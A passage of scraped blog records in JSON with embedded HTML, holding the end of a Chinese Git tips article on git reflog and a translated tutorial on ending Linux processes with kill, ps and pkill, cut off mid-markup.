12:00:00’}）。</p>\n<p>您还可以将这些基于日期的修改参数与使用修正参数的任何 Git 子命令一起使用。在 gitrevisions 手册页中有关于具体使用哪种格式的详细信息。</p>\n<h3>12. 全知的 reflog</h3>\n<p>你是不是试过在 rebase 时干掉过某次提交，后来又发现你需要保留这次提交的一些东西？你可能觉得这些提交的东西已经永远找不回来了，只能从头再来了。其实不然，但如果你在本地工作副本中提交了，提交就会进入到 “引用日志” ，你仍然可以访问到。</p>\n<p>运行 git reflog 将在本地工作副本中显示当前分支的所有活动的列表，并为您提供每个提交的 SHA1 值。一旦发现你 rebase 时放弃的那个提交，你可以运行 git checkout  来检出该次提交，复制好你需要的信息，然后再运行 git checkout HEAD 返回到分支最新的提交去。</p>\n<h3>以上就是全部内容</h3>\n<p>希望这些技巧中至少有一个能教你一些关于 Git 的新知识，Git 已经 12 岁了，在这个持续创新，不断添加新特性的项目里，你最喜欢哪个技巧？</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113885\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113885votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113885\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Git", "url": "http://blog.jobbole.com/113885/", "url_obj_id": "19e82073707c6fead43789396f1c0f0a"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "title": "精通 Linux 的 “kill” 命令", "create_date": "2018/04/17 ·", "praise_num": 2, "fav_num": 2, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.maketecheasier.com/kill-command-in-linux/\">maketecheasier</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-2116-1-rel.html\">Linux中国/flsf</a>   </div><p>无论你使用哪种操作系统，你一定会遇到某个行为失常的应用，它把自己锁死并拒绝关闭。在Linux(还有Mac)，你可以用一个”kill”命令强制终结它。在这个教程中，我们将展示给你多种方式使用”kill”命令终结应用。</p>\n<h3><strong>Kill命令和信号</strong></h3>\n<p>当你执行一个”kill”命令，你实际上发送了一个信号给系统，让它去终结不正常的应用。总共有60个你可以使用的信号，但是基本上你只需要知道SIGTERM(15)和SIGKILL(9)。</p>\n<p>你可以用这个命令看到所有信号的列表：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93252abe465646438\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nkill -l</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93252abe465646438-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93252abe465646438-1\"><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/48403246372fb16ffcd27eb6495b82a0.png\" alt=\"\" width=\"740\" height=\"341\"></p>\n<ul>\n<li>SIGTERM – 此信号请求一个进程停止运行。此信号是可以被忽略的。进程可以用一段时间来正常关闭，一个程序的正常关闭一般需要一段时间来保存进度并释放资源。换句话说，它不是强制停止。</li>\n<li>SIGKILL – 此信号强制进程立刻停止运行。程序不能忽略此信号，而未保存的进度将会丢失。</li>\n</ul>\n<p>使用”kill”的语法是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93252ac9029286157\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nkill [信号或选项] PID(s)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93252ac9029286157-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93252ac9029286157-1\"><span class=\"crayon-i\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span>信号或选项<span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PID</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>默认信号（当没有指定的时候）是SIGTERM。当它不起作用时，你可以使用下面的命令来强制kill掉一个进程:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93252acd540646321\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nkill SIGKILL PID</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93252acd540646321-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93252acd540646321-1\"><span class=\"crayon-e\">kill </span><span class=\"crayon-e\">SIGKILL </span><span class=\"crayon-v\">PID</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>或者</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93252ad1464264634\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nkill -9 PID</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93252ad1464264634-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93252ad1464264634-1\"><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">PID</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这里”-9″代表着SIGKILL信号。</p>\n<p>如果你不知道应用的PID，仅需要运行这个命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93252ad4641376022\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nps ux</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93252ad4641376022-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93252ad4641376022-1\"><span class=\"crayon-e\">ps </span><span class=\"crayon-v\">ux</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>它会显示所有正在运行的应用还有应用的PID。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/fdb483b1624e6e05fd5e2b6f84722403.png\" alt=\"\" width=\"700\" height=\"414\"></p>\n<p>例如，要kill掉Chrome，我会运行命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93252ad7817820414\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nkill -9 3629</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93252ad7817820414-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93252ad7817820414-1\"><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3629</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>也可以在同一时间kill多个进程。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93252ada780012945\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nkill -9 PID1 PID2 PID3</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93252ada780012945-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93252ada780012945-1\"><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PID1 </span><span class=\"crayon-e\">PID2 </span><span class=\"crayon-v\">PID3</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3><strong>PKill</strong></h3>\n<p>“pkill”命令允许使用扩展的正则表达式和其它匹配方式。你现在可以使用应用的进程名kill掉它们，而不是使用PID。例如，要kill掉Firefox浏览器，只需要运行命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93252add935517642\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npkill firefox</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93252add935517642-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93252add935517642-1\"><span class=\"crayon-e\">pkill </span><span class=\"crayon-v\">firefox</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0033 seconds] -->\r\n<p>使用正则表达式匹配的话，你可以输入进程名的部分字符，比如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93252ae1561406647\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npkill fire</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" 